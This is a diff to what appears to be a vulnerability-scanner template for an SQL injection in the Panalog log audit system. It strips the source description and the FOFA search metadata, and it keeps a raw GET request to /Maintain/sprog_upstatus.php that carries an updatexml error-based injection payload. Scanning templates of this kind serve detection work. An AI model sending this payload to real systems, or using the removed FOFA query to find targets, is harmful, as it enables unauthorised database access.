@@ -3,12 +3,8 @@ info:
   name: Panalog 日志审计系统 sprog_upstatus.php SQL
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bt9geg5gpu8l4w8g'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bt9geg5gpu8l4w8g
-    fofa: body="Maintain/cloud_index.php"
 http:
 - raw:
   - 'GET /Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1) HTTP/1.1
